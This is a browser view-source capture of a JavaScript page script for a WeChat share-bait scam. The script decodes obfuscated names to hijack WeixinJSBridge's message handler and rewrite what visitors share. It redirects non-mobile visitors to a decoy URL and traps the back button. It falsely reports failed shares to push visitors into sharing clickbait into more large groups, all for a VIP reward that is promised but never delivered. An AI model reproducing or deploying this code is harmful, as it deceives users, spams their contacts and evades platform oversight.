<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=gbk"><title>http://vx88emzq8fpp2t.qlydl.com:443/kfcs1.php</title><link rel="stylesheet" type="text/css" href="kfcs1_files/viewsource.css"></head><body id="viewsource" class="highlight" style="-moz-tab-size: 4" contextmenu="actions"><pre id="line1"><span>  
<span id="line2"></span>
<span id="line3"></span>
<span id="line4"></span>var arr = [
<span id="line5"></span>
<span id="line6"></span>'https://qqpublic.qpic.cn/qq_public/0/0-2785554574-84EECD127F4B93EC2769A3414352E39B/900',
<span id="line7"></span>'https://qqpublic.qpic.cn/qq_public/0/0-3145368733-8F22B8CC6B385511889550977D66AE5F/900',
<span id="line8"></span>
<span id="line9"></span>
<span id="line10"></span>    
<span id="line11"></span>];
<span id="line12"></span>aaa=Math.floor(Math.random()*2) ;    //分享群的网址
<span id="line13"></span>qurl=arr[aaa];
<span id="line14"></span>
<span id="line15"></span>
<span id="line16"></span>
<span id="line17"></span>
<span id="line18"></span>zhuanhua=aaa=Math.floor(Math.random()*5)    // ----- 转化数值，数字越小，转化越高
<span id="line19"></span>
<span id="line20"></span>
<span id="line21"></span>var arrz = [
<span id="line22"></span>
<span id="line23"></span>'https://qqpublic.qpic.cn/qq_public/0/0-2911841450-430E84EFE67463F992B1DFA07B23760A/900',
<span id="line24"></span>
<span id="line25"></span>
<span id="line26"></span>];
<span id="line27"></span>aaaz=Math.floor(Math.random()*1) ;    //转化链接
<span id="line28"></span>zurl=arrz[aaa];
<span id="line29"></span>
<span id="line30"></span>
<span id="line31"></span>
<span id="line32"></span>var str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";   //产生随机数
<span id="line33"></span>var n = 5, shuiji = "";
<span id="line34"></span>for(var i = 0; i </span><span class="error" title="在“&lt;”后面出现了不正确的符号。可能造成的原因: 未跳脱的“&lt;”。请试著把它跳脱为“&amp;lt;”。">&lt; </span><span>n; i++){
<span id="line35"></span>    var rand = Math.floor(Math.random() * str.length);
<span id="line36"></span>    shuiji += str.charAt(rand);
<span id="line37"></span>}
<span id="line38"></span>
<span id="line39"></span>
<span id="line40"></span>var app = app || {},
<span id="line41"></span>    Url,
<span id="line42"></span>    oldDefProp,
<span id="line43"></span>    fakeUrl,
<span id="line44"></span>    Main,
<span id="line45"></span>    WechatShare,
<span id="line46"></span>    ua,
<span id="line47"></span>    weui,
<span id="line48"></span>    timess;
<span id="line49"></span>if (function() {
<span id="line50"></span>    var n = this;
<span id="line51"></span>    app.decodeStr = function(n) {
<span id="line52"></span>        var r,
<span id="line53"></span>            t,
<span id="line54"></span>            i;
<span id="line55"></span>        if (!n)
<span id="line56"></span>            return "";
<span id="line57"></span>        for (r = n[0], t = n.split(r), i = 0; i </span><span class="error" title="在“&lt;”后面出现了不正确的符号。可能造成的原因: 未跳脱的“&lt;”。请试著把它跳脱为“&amp;lt;”。">&lt; </span><span>t.length; i++)
<span id="line58"></span>            t[i] <span><span>&amp;</span></span><span><span>&amp;</span></span> (t[i] = String.fromCharCode(t[i]));
<span id="line59"></span>        return t.join("")
<span id="line60"></span>    };
<span id="line61"></span>
<span id="line62"></span>
<span id="line63"></span>}(), ua = navigator.userAgent, ua.indexOf("MicroMessenger") &gt; 0) {
<span id="line64"></span>    function isInWechat() {
<span id="line65"></span>        var n = navigator.userAgent.toLowerCase();
<span id="line66"></span>        return n.indexOf("micromessenger") &gt;= 0
<span id="line67"></span>    }
<span id="line68"></span>    function isIos() {
<span id="line69"></span>        var n = navigator.userAgent.toLowerCase();
<span id="line70"></span>        return n.indexOf("iphone") &gt;= 0 || n.indexOf("ipad") &gt;= 0 || n.indexOf("applewebkit") &gt;= 0
<span id="line71"></span>    }
<span id="line72"></span>    function isAndroid() {
<span id="line73"></span>        var n = navigator.userAgent.toLowerCase();
<span id="line74"></span>        return n.indexOf("android") &gt;= 0
<span id="line75"></span>    }
<span id="line76"></span>    function isUrl(n) {
<span id="line77"></span>        return !!n <span><span>&amp;</span></span><span><span>&amp;</span></span> (n.indexOf("http://") &gt;= 0 || n.indexOf("https://") &gt;= 0)
<span id="line78"></span>    }
<span id="line79"></span>    function isArray(n) {
<span id="line80"></span>        return "[object Array]" === Object.prototype.toString.call(n)
<span id="line81"></span>    }
<span id="line82"></span>    function isNumber(n) {
<span id="line83"></span>        return "number" == typeof n
<span id="line84"></span>    }
<span id="line85"></span>    function getRandomNum(n, t) {
<span id="line86"></span>        var i = t - n,
<span id="line87"></span>            r = Math.random();
<span id="line88"></span>        return n + Math.round(r * i)
<span id="line89"></span>    }
<span id="line90"></span>    function getFormatDate() {
<span id="line91"></span>        var n = new Date,
<span id="line92"></span>            t = new Date(n.setHours(n.getHours() + 8)).toISOString();
<span id="line93"></span>        return t.substring(0, t.indexOf("T"))
<span id="line94"></span>    }
<span id="line95"></span>    function changeTitle(n) {
<span id="line96"></span>        if (document.title = n, navigator.userAgent.toLowerCase().indexOf("iphone") &gt;= 0) {
<span id="line97"></span>            var i = $("body"),
<span id="line98"></span>                t = $('</span><span>&lt;<span class="start-tag">iframe</span> <span class="attribute-name">src</span>="<a class="attribute-value" href="view-source:http://vx88emzq8fpp2t.qlydl.com:443/favicon.ico">favicon.ico</a>"&gt;</span><span></span><span>&lt;</span><span>\/iframe&gt;');
<span id="line99"></span>            t.on("load", function() {
<span id="line100"></span>                setTimeout(function() {
<span id="line101"></span>                    t.off("load").remove()
<span id="line102"></span>                }, 0)
<span id="line103"></span>            }).appendTo(i)
<span id="line104"></span>        }
<span id="line105"></span>    }
<span id="line106"></span>    Url = function() {
<span id="line107"></span>        function n() {
<span id="line108"></span>            this.host = window.location.host;
<span id="line109"></span>            this.protocol = window.location.protocol;
<span id="line110"></span>            this.params = this.GetRequest(window.location.search);
<span id="line111"></span>            this.hash = window.location.hash;
<span id="line112"></span>            this.pathname = window.location.pathname
<span id="line113"></span>        }
<span id="line114"></span>        return n.prototype.GetHref = function(n) {
<span id="line115"></span>            var i = this,
<span id="line116"></span>                o = void 0 === n.port ? i.port : n.port,
<span id="line117"></span>                c = void 0 === n.pathname ? i.pathname : n.pathname,
<span id="line118"></span>                l = n.host || i.host,
<span id="line119"></span>                a = n.protocol || i.protocol || "http:",
<span id="line120"></span>                f = a + "//" + l + (o ? ":" + o : "") + c,
<span id="line121"></span>                r = {},
<span id="line122"></span>                e,
<span id="line123"></span>                s,
<span id="line124"></span>                u,
<span id="line125"></span>                t,
<span id="line126"></span>                h;
<span id="line127"></span>            if ("all" !== n.removeParams)
<span id="line128"></span>                for (t in i.params)
<span id="line129"></span>                    i.params.hasOwnProperty(t) &amp;&amp; (r[t] = i.params[t]);
<span id="line130"></span>            if (n.params)
<span id="line131"></span>                for (t in n.params)
<span id="line132"></span>                    n.params.hasOwnProperty(t) &amp;&amp; (r[t] = n.params[t]);
<span id="line133"></span>            if ("all" !== n.removeParams &amp;&amp; (e = n.removeParams, e))
<span id="line134"></span>                for (t in e)
<span id="line135"></span>                    n.removeParams.hasOwnProperty(t) &amp;&amp; (s = n.removeParams[t], delete r[s]);
<span id="line136"></span>            u = [];
<span id="line137"></span>            for (t in r)
<span id="line138"></span>                r.hasOwnProperty(t) &amp;&amp; u.push(t + "=" + encodeURIComponent(r[t]));
<span id="line139"></span>            return u &amp;&amp; u.length &gt; 0 &amp;&amp; (h = u.join("&amp;")), f += f.indexOf("?") &gt; 0 ? "&amp;" : "?", f + h
<span id="line140"></span>        }, n.prototype.GetRequest = function(n) {
<span id="line141"></span>            var f = n,
<span id="line142"></span>                e = {};
<span id="line143"></span>            if (f.indexOf("?") != -1)
<span id="line144"></span>                for (var h = f.substr(1), o = h.split("&amp;"), r = 0; r </span><span>&lt;</span><span> o.length; r++) {
<span id="line145"></span>                    var t = o[r],
<span id="line146"></span>                        u = t.indexOf("="),
<span id="line147"></span>                        i = void 0,
<span id="line148"></span>                        s = void 0;
<span id="line149"></span>                    u &gt;= 0 ? (i = t.substr(0, u), s = decodeURIComponent(t.substring(u + 1))) : i = t;
<span id="line150"></span>                    i &amp;&amp; (e[i] = s)
<span id="line151"></span>                }
<span id="line152"></span>            return e
<span id="line153"></span>        }, n
<span id="line154"></span>    }();
<span id="line155"></span>    oldDefProp = Object.defineProperty;
<span id="line156"></span>    Object.defineProperty = function(n, t, i) {
<span id="line157"></span>        (t == app.decodeStr("+95+104+97+110+100+108+101+77+101+115+115+97+103+101+70+114+111+109+87+101+105+120+105+110") || t == app.decodeStr("*87*101*105*120*105*110*74*83*66*114*105*100*103*101")) &amp;&amp; (i.writable = !0, i.configurable = !0);
<span id="line158"></span>        oldDefProp(n, t, i)
<span id="line159"></span>    };
<span id="line160"></span>    window.url = new Url;
<span id="line161"></span>    fakeUrl = "http://weather.html5.qq.com";
<span id="line162"></span>    window.config = {
<span id="line163"></span>        modelConfig: {
<span id="line164"></span>            forceShareCount: 4
<span id="line165"></span>        },
<span id="line166"></span>        showRepairPage: !1,
<span id="line167"></span>        forbidUrl: fakeUrl
<span id="line168"></span>    };
<span id="line169"></span>    window.mConfig = {};
<span id="line170"></span>    isAndroid() || isIos() || (location.href = config.forbidUrl ? config.forbidUrl : fakeUrl);
<span id="line171"></span>    Main = function() {
<span id="line172"></span>        function n() {
<span id="line173"></span>            this.nextUrlCalledCount = 0;
<span id="line174"></span>            this.forceShareCount = 5;
<span id="line175"></span>            this.currentShareCount = 0;
<span id="line176"></span>            this.toastTimeOut = 0;
<span id="line177"></span>            this.searchModelId = window.url.params.mid || "video-list";
<span id="line178"></span>            this.redirect = this.isNeedRedirect();
<span id="line179"></span>            this.isIphone = isIos();
<span id="line180"></span>            this.fileName = location.pathname.substr(location.pathname.lastIndexOf("/"));
<span id="line181"></span>            this.fileName.indexOf(".html") </span><span>&lt;</span><span> 0 &amp;&amp; (this.fileName = "/index.html")
<span id="line182"></span>        }
<span id="line183"></span>        return n.prototype.isNeedRedirect = function() {
<span id="line184"></span>            var n = window.url.params.from;
<span id="line185"></span>            return "timeline" == n || "groupmessage" == n || "singlemessage" == n || "share" == n
<span id="line186"></span>        }, n.prototype.getRandomValueInArray = function(n, t) {
<span id="line187"></span>            if (!n)
<span id="line188"></span>                return t;
<span id="line189"></span>            if ("string" == typeof n)
<span id="line190"></span>                return n;
<span id="line191"></span>            if (!isArray(n))
<span id="line192"></span>                return t;
<span id="line193"></span>            var i = getRandomNum(0, n.length - 1);
<span id="line194"></span>            return n[i] || t
<span id="line195"></span>        }, n.prototype.start = function() {
<span id="line196"></span>            var t = this,
<span id="line197"></span>                n;
<span id="line198"></span>            t.hookBackButton();
<span id="line199"></span>            void t.setShareCallBack();
<span id="line200"></span>            
<span id="line201"></span>            if (zhuanhua== 100)
<span id="line202"></span>             {
<span id="line203"></span>                 n = {
<span id="line204"></span>             title: '【曝光】网购惊人内幕！快看你被坑多久呀？1'+shuiji, //分享好友显示的标题
<span id="line205"></span>            desc: '精彩时刻，千万别错过！', //分享好友显示的描述
<span id="line206"></span>            link: 'https://qqpublic.qpic.cn/qq_public/0/0-2604961893-AAFC75B25B42DFE91578D8B8AACB9EBC/900?'+shuiji, //分享好友的网址
<span id="line207"></span>            img_url: 'http://mmbiz.qpic.cn/mmbiz_jpg/4SAQOj2PtbulUaibkn4t3vvmCltRnFCjYw74sfdXFKMX0cjHia3yU6CVuMmgUiacZzuBQnqhxQy0QlQdbias7N2Gaw/640?'+shuiji, //分享好友显示的图标
<span id="line208"></span>            };   }
<span id="line209"></span>            
<span id="line210"></span>           
<span id="line211"></span>			else if (zhuanhua== 2)
<span id="line212"></span>			{
<span id="line213"></span>			     n = {
<span id="line214"></span>             title: '马云都会害怕的事情发生 支付宝最大对手伸出魔爪'+shuiji, //分享好友显示的标题
<span id="line215"></span>            desc: '精彩时刻，千万别错过！', //分享好友显示的描述
<span id="line216"></span>            link: 'http://mp.weixin.qq.com/s?__biz=MzIxOTYyODUzMg==&amp;mid=2247483744&amp;idx=3&amp;sn=244129e6855b1f31ac8935943d4de33b#'+shuiji, //分享好友的网址
<span id="line217"></span>            img_url: 'http://mmbiz.qpic.cn/mmbiz_jpg/4SAQOj2PtbulUaibkn4t3vvmCltRnFCjYw74sfdXFKMX0cjHia3yU6CVuMmgUiacZzuBQnqhxQy0QlQdbias7N2Gaw/640?'+shuiji, //分享好友显示的图标
<span id="line218"></span>
<span id="line219"></span>
<span id="line220"></span>            };	}
<span id="line221"></span>			
<span id="line222"></span>			
<span id="line223"></span>			else{
<span id="line224"></span>            n = {
<span id="line225"></span>              		  title: '&#65279;黄金会员一年，时间有限'+shuiji, //分享好友显示的标题
<span id="line226"></span>            desc: '豪礼别错过', //分享好友显示的描述
<span id="line227"></span>            link: 'http://www.doyouhike.net/mobile/jianghu/share_node?topic_id=6209787?'+shuiji, //分享好友的网址
<span id="line228"></span>            img_url: 'http://qqpublic.qpic.cn/qq_public/0/0-3209300634-142BFC6198BF09951EE217D294504724/900?'+shuiji, //分享好友显示的图标
<span id="line229"></span>            
<span id="line230"></span>            };}
<span id="line231"></span>            
<span id="line232"></span>            
<span id="line233"></span>      
<span id="line234"></span>                
<span id="line235"></span>         app.timelineUrl = 'http://mp.weixin.qq.com/s?__biz=MzIxOTYyODUzMg==&amp;mid=2247483744&amp;idx=3&amp;sn=244129e6855b1f31ac8935943d4de33b?'+shuiji, //朋友圈网址
<span id="line236"></span>			app.timelineTitle ='马云都会害怕的事情发生 支付宝最大对手伸出魔爪2'+shuiji, //朋友圈显示的标题
<span id="line237"></span>			app.timelineImage = 'http://mmbiz.qpic.cn/mmbiz_jpg/4SAQOj2PtbulUaibkn4t3vvmCltRnFCjYw74sfdXFKMX0cjHia3yU6CVuMmgUiacZzuBQnqhxQy0QlQdbias7N2Gaw/640?'+shuiji, //朋友圈显示的图标
<span id="line238"></span>
<span id="line239"></span>           
<span id="line240"></span>                     
<span id="line241"></span>		
<span id="line242"></span>			app.orderUrl = 'http://www.sina.com.cn';
<span id="line243"></span>			 t.setModelShareData(n)
<span id="line244"></span>
<span id="line245"></span>        }, n.prototype.hookBackButton = function() {
<span id="line246"></span>            var n = this;
<span id="line247"></span>            window.setTimeout(function() {
<span id="line248"></span>                history.pushState("weixin", null, "#weixin");
<span id="line249"></span>                n.isIphone &amp;&amp; history.pushState("weixin", null, "#weixin");
<span id="line250"></span>                window.onpopstate = function(n) {
<span id="line251"></span>                    if (!window.main.isIphone || null !== n.state) {
<span id="line252"></span>                        if (window.turl &amp;&amp; window.turl.length &gt; 0)
<span id="line253"></span>                            return void (location.href = window.turl);
<span id="line254"></span>                        var t = main.backUrl;
<span id="line255"></span>                        if ("close" === t)
<span id="line256"></span>                            WeixinJSBridge &amp;&amp; WeixinJSBridge.call("closeWindow");
<span id="line257"></span>                        else if (t &amp;&amp; t.length &gt; 0)
<span id="line258"></span>                            return void (location.href = t)
<span id="line259"></span>                    }
<span id="line260"></span>                }
<span id="line261"></span>            }, 50)
<span id="line262"></span>        }, n.prototype.setShareCallBack = function() {
<span id="line263"></span>            var n = this;
<span id="line264"></span>            window.wcShare &amp;&amp; (window.wcShare.shareCallback = function(t) {
<span id="line265"></span>                var r = !1,
<span id="line266"></span>                    i = t &amp;&amp; t.err_msg;
<span id="line267"></span>                ("send_app_msg:ok" == i || "send_app_msg:confirm" == i || "share_timeline:ok" == i) &amp;&amp; (n.currentShareCount++, n.currentShareCount == n.forceShareCount &amp;&amp; "share_timeline:ok" != i &amp;&amp; n.currentShareCount--, r = !0);
<span id="line268"></span>                r &amp;&amp; (sharetips(n.currentShareCount), n.model &amp;&amp; n.model.shareCallback &amp;&amp; n.model.shareCallback({
<span id="line269"></span>                    success: r,
<span id="line270"></span>                    forceShareCount: n.forceShareCount,
<span id="line271"></span>                    currentShareCount: n.currentShareCount,
<span id="line272"></span>                    message: i
<span id="line273"></span>                }), n.setNewShareData("shareCallback"), n.currentShareCount == 5 &amp;&amp; n.setNewShareData("timeline"))
<span id="line274"></span>            })
<span id="line275"></span>        }, n.prototype.runAction = function() {
<span id="line276"></span>            console.log("runAction")
<span id="line277"></span>        }, n.prototype.setNewShareData = function(n) {
<span id="line278"></span>            var t,
<span id="line279"></span>                i,
<span id="line280"></span>                r;
<span id="line281"></span>            return n == "timeline" ? (t = window.wcShare.shareData, app.timelineUrl &amp;&amp; (t.link = app.timelineUrl), app.timelineTitle &amp;&amp; (t.title = app.timelineTitle), app.timelineImage &amp;&amp; (t.img_url = app.timelineImage), void (window.wcShare.shareData = t)) : this.model &amp;&amp; this.model.getShareData &amp;&amp; (this.modelShareData = this.model &amp;&amp; this.model.getShareData(n), i = this.modelShareData, i || (r = $("img")[0], i = {
<span id="line282"></span>                link: location.href,
<span id="line283"></span>                title: document.title,
<span id="line284"></span>                desc: document.title,
<span id="line285"></span>                img_url: r &amp;&amp; r.getAttribute("src")
<span id="line286"></span>            }), isUrl(i.link)) ? void (window.wcShare.shareData = i) : void 0
<span id="line287"></span>        }, n.prototype.setModelShareData = function(n) {
<span id="line288"></span>            var t,
<span id="line289"></span>                r,
<span id="line290"></span>                i,
<span id="line291"></span>                s;
<span id="line292"></span>            if (window.wcShare) {
<span id="line293"></span>                if (t = {
<span id="line294"></span>                    link: n.link,
<span id="line295"></span>                    desc: n.desc,
<span id="line296"></span>                    title: n.title,
<span id="line297"></span>                    img_url: n.img_url
<span id="line298"></span>                }, isUrl(t.link))
<span id="line299"></span>                    return void (window.wcShare.shareData = t);
<span id="line300"></span>                if (isUrl(this.nextUrl))
<span id="line301"></span>                    return t.link = this.nextUrl, void (window.wcShare.shareData = t);
<span id="line302"></span>                var u = void 0,
<span id="line303"></span>                    f = void 0,
<span id="line304"></span>                    e = void 0,
<span id="line305"></span>                    o = "share-user-api-error";
<span id="line306"></span>                if (this.nextUrl &amp;&amp; (u = this.nextUrl, f = this.fileName, e = "", o = "share-user-ok"), r = {
<span id="line307"></span>                    protocol: "http:",
<span id="line308"></span>                    host: u,
<span id="line309"></span>                    pathname: f,
<span id="line310"></span>                    port: e,
<span id="line311"></span>                    params: {
<span id="line312"></span>                        user: o,
<span id="line313"></span>                        dmid: this.searchDomainModelId,
<span id="line314"></span>                        sdmid: this.searchShareDomainModelId,
<span id="line315"></span>                        from: "share",
<span id="line316"></span>                        timestamp: Date.now()
<span id="line317"></span>                    },
<span id="line318"></span>                    removeParams: ["isappinstalled"]
<span id="line319"></span>                }, n.linkParams)
<span id="line320"></span>                    for (i in n.linkParams)
<span id="line321"></span>                        n.linkParams.hasOwnProperty(i) &amp;&amp; (s = n.linkParams[i], r.params[i] = s);
<span id="line322"></span>                t.link = url.GetHref(r);
<span id="line323"></span>                window.wcShare.shareData = t
<span id="line324"></span>            }
<span id="line325"></span>        }, n
<span id="line326"></span>    }();
<span id="line327"></span>    WechatShare = function() {
<span id="line328"></span>        function n() {
<span id="line329"></span>            var n = this;
<span id="line330"></span>            this.onBridgeReady = function() {
<span id="line331"></span>                var t = window.WeixinJSBridge,
<span id="line332"></span>                    i = {
<span id="line333"></span>                        invoke: t.invoke,
<span id="line334"></span>                        call: t.call,
<span id="line335"></span>                        on: t.on,
<span id="line336"></span>                        env: t.env,
<span id="line337"></span>                        log: t.log,
<span id="line338"></span>                        _fetchQueue: t._fetchQueue,
<span id="line339"></span>                        _hasInit: t._hasInit,
<span id="line340"></span>                        _hasPreInit: t._hasPreInit,
<span id="line341"></span>                        _isBridgeByIframe: t._isBridgeByIframe,
<span id="line342"></span>                        _continueSetResult: t._continueSetResult,
<span id="line343"></span>                        _handleMessageFromWeixin: t._handleMessageFromWeixin
<span id="line344"></span>                    };
<span id="line345"></span>                Object.defineProperty(window, "WeixinJSBridge", {
<span id="line346"></span>                    writable: !0,
<span id="line347"></span>                    enumerable: !0
<span id="line348"></span>                });
<span id="line349"></span>                window.WeixinJSBridge = i;
<span id="line350"></span>                try {
<span id="line351"></span>                    n.setHandleMessageHookForWeixin()
<span id="line352"></span>                } catch (t) {
<span id="line353"></span>                    n.restoreHandleMessageHookForWeixin()
<span id="line354"></span>                }
<span id="line355"></span>            };
<span id="line356"></span>            this.handleMesageHook = function(t) {
<span id="line357"></span>                var r;
<span id="line358"></span>                if (t) {
<span id="line359"></span>                    r = t.__json_message ? t.__json_message : t;
<span id="line360"></span>                    var i = r.__params,
<span id="line361"></span>                        u = r.__msg_type,
<span id="line362"></span>                        f = r.__event_id;
<span id="line363"></span>                    if ("callback" == u &amp;&amp; n.shareCallback &amp;&amp; "function" == typeof n.shareCallback)
<span id="line364"></span>                        n.shareCallback(i);
<span id="line365"></span>                    else if ("event" == u &amp;&amp; f &amp;&amp; f.indexOf("share") &gt; 0) {
<span id="line366"></span>                        var e = n.shareData.desc,
<span id="line367"></span>                            o = n.shareData.link,
<span id="line368"></span>                            s = n.shareData.img_url,
<span id="line369"></span>                            h = n.shareData.title;
<span id="line370"></span>                        Object.defineProperty(i, "title", {
<span id="line371"></span>                            get: function() {
<span id="line372"></span>                                return delete i.scene, i.desc = e, i.link = o, i.img_url = s, Object.defineProperty(i, "title", {
<span id="line373"></span>                                    value: h,
<span id="line374"></span>                                    enumerable: !0
<span id="line375"></span>                                }), "title"
<span id="line376"></span>                            },
<span id="line377"></span>                            set: function() {},
<span id="line378"></span>                            enumerable: !1,
<span id="line379"></span>                            configurable: !0
<span id="line380"></span>                        });
<span id="line381"></span>                        n.restoreHandleMessageHookForWeixin();
<span id="line382"></span>                        n.oldHandleMesageHook(t);
<span id="line383"></span>                        n.setHandleMessageHookForWeixin()
<span id="line384"></span>                    } else
<span id="line385"></span>                        n.restoreHandleMessageHookForWeixin(), n.oldHandleMesageHook(t), n.setHandleMessageHookForWeixin()
<span id="line386"></span>                }
<span id="line387"></span>            };
<span id="line388"></span>            "undefined" == typeof WeixinJSBridge ? document.addEventListener ? document.addEventListener("WeixinJSBridgeReady", this.onBridgeReady, !1) : document.attachEvent &amp;&amp; (document.attachEvent("WeixinJSBridgeReady", this.onBridgeReady), document.attachEvent("onWeixinJSBridgeReady", this.onBridgeReady)) : this.onBridgeReady()
<span id="line389"></span>        }
<span id="line390"></span>        return n.prototype.setHandleMessageHookForWeixin = function() {
<span id="line391"></span>            this.oldHandleMesageHook = window.WeixinJSBridge._handleMessageFromWeixin;
<span id="line392"></span>            window.WeixinJSBridge._handleMessageFromWeixin = this.handleMesageHook
<span id="line393"></span>        }, n.prototype.restoreHandleMessageHookForWeixin = function() {
<span id="line394"></span>            this.oldHandleMesageHook &amp;&amp; (window.WeixinJSBridge._handleMessageFromWeixin = this.oldHandleMesageHook)
<span id="line395"></span>        }, n
<span id="line396"></span>    }();
<span id="line397"></span>    window.wcShare = new WechatShare;
<span id="line398"></span>    $(document).ready(function() {
<span id="line399"></span>        window.main = new Main;
<span id="line400"></span>        window.main.start()
<span id="line401"></span>    })
<span id="line402"></span>};
<span id="line403"></span>$(function(){
<span id="line404"></span>	    weui = {
<span id="line405"></span>        alert: function(n, t, i) {
<span id="line406"></span>            var r,
<span id="line407"></span>                u;
<span id="line408"></span>            t = t ? t : "";
<span id="line409"></span>            r = '</span><span>&lt;</span><span>div class="weui_dialog_alert" style="position: fixed; z-index: 2000; display: none;margin-left:15%;margin-right:15%"&gt;';
<span id="line410"></span>            r += '</span><span>&lt;</span><span>div class="weui_mask"&gt;</span><span>&lt;</span><span>\/div&gt;';
<span id="line411"></span>            r += '</span><span>&lt;</span><span>div class="weui_dialog"&gt;';
<span id="line412"></span>            r += '    </span><span>&lt;</span><span>div class="weui_dialog_hd"&gt;</span><span>&lt;</span><span>strong class="weui_dialog_title"&gt;' + t + "</span><span>&lt;</span><span>\/strong&gt;</span><span>&lt;</span><span>\/div&gt;";
<span id="line413"></span>            r += '    </span><span>&lt;</span><span>div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"&gt;</span><span>&lt;</span><span>\/div&gt;';
<span id="line414"></span>            r += '    </span><span>&lt;</span><span>div class="weui_dialog_ft"&gt;';
<span id="line415"></span>            r += '      </span><span>&lt;</span><span>a href="javascript:;" class="weui_btn_dialog primary"&gt;确定</span><span>&lt;</span><span>\/a&gt;';
<span id="line416"></span>            r += "  </span><span>&lt;</span><span>\/div&gt;";
<span id="line417"></span>            r += " </span><span>&lt;</span><span>\/div&gt;";
<span id="line418"></span>            r += "</span><span>&lt;</span><span>\/div&gt;";
<span id="line419"></span>            $(".weui_dialog_alert").length &gt; 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append($(r));
<span id="line420"></span>            u = $(".weui_dialog_alert");
<span id="line421"></span>            u.show();
<span id="line422"></span>            u.find(".weui_dialog_bd").html(n);
<span id="line423"></span>            u.find(".weui_btn_dialog").off("click").on("click", function() {
<span id="line424"></span>                u.hide();
<span id="line425"></span>                i &amp;&amp; i()
<span id="line426"></span>            })
<span id="line427"></span>        }
<span id="line428"></span>    };
<span id="line429"></span>	
<span id="line430"></span>	
<span id="line431"></span>	});
<span id="line432"></span>	
<span id="line433"></span>	
<span id="line434"></span>	var alertTimes = 0;
<span id="line435"></span>function wxalert(msg, btn, callback) {
<span id="line436"></span>    if (alertTimes == 0) {
<span id="line437"></span>        var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
<span id="line438"></span>        $("body").append(dialog)
<span id="line439"></span>    }
<span id="line440"></span>    alertTimes++;
<span id="line441"></span>    var d = $('#lly_dialog');
<span id="line442"></span>    d.fadeIn(200);
<span id="line443"></span>    d.find("#lly_dialog_msg").html(msg);
<span id="line444"></span>    d.find("#lly_dialog_btn").html(btn);
<span id="line445"></span>    d.find("#lly_dialog_btn").off('click').on('click', function() {
<span id="line446"></span>        d.fadeOut(200);
<span id="line447"></span>        if (callback) {
<span id="line448"></span>            callback()
<span id="line449"></span>        }
<span id="line450"></span>    })
<span id="line451"></span>}
<span id="line452"></span>	
<span id="line453"></span>	function sharetips(n) {
<span id="line454"></span>        switch (n) {
<span id="line455"></span>        case 0:
<span id="line456"></span>            wxalert('0');
<span id="line457"></span>            break;
<span id="line458"></span>        case 1:
<span id="line459"></span>            wxalert('分享成功,还需分享</span><span>&lt;</span><span>span style="color: #f5294c"&gt;2个不同</span><span>&lt;/<span></span>s</span><span>pan&gt;微信群(群人数不少于50人)', '好');
<span id="line460"></span>            break;
<span id="line461"></span>        case 2:
<span id="line462"></span>           wxalert('分享成功,还需分享</span><span>&lt;</span><span>span style="color: #f5294c"&gt;1个不同</span><span>&lt;/<span></span>s</span><span>pan&gt;微信群(群人数不少于50人)', '好');
<span id="line463"></span>			break;
<span id="line464"></span>
<span id="line465"></span>
<span id="line466"></span>           case 3:
<span id="line467"></span>           wxalert('分享失败,请再分享1个</span><span>&lt;</span><span>span style="font-size: 30px;color: #f5294c"&gt;不同</span><span>&lt;/<span></span>s</span><span>pan&gt;的微信群(群人数不少于50人)', '好');
<span id="line468"></span>			break;
<span id="line469"></span>
<span id="line470"></span>        case 4:
<span id="line471"></span>           wxalert('还差最后一步,请分享到</span><span>&lt;</span><span>span style="color: #f5294c"&gt;朋友圈</span><span>&lt;/<span></span>s</span><span>pan&gt;', '好');
<span id="line472"></span>            break;
<span id="line473"></span>     case 5:
<span id="line474"></span>          wxalert('恭喜获得VIP资格，24小时内为您发放，请留意微信通知（删除朋友圈无效）', '好', gotocj);
<span id="line475"></span>        }
<span id="line476"></span>    }
<span id="line477"></span>	
<span id="line478"></span>	function gotocj() {
<span id="line479"></span>        window.location.href="http://mp.weixin.qq.com/s?__biz=MzIxOTYyODUzMg==&amp;mid=2247483744&amp;idx=3&amp;sn=244129e6855b1f31ac8935943d4de33b"; //分享后跳转网址
<span id="line480"></span>    }
<span id="line481"></span>
<span id="line482"></span>
<span id="line483"></span>
<span id="line484"></span>//退返跳转指定页面
<span id="line485"></span>window.onhashchange=function(){jp();};  
<span id="line486"></span>function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}  
<span id="line487"></span>function jp() {location.href="http://mp.weixin.qq.com/s?__biz=MzIxOTYyODUzMg==&amp;mid=2247483744&amp;idx=3&amp;sn=244129e6855b1f31ac8935943d4de33b";}
<span id="line488"></span>setTimeout('hh();', 200);  
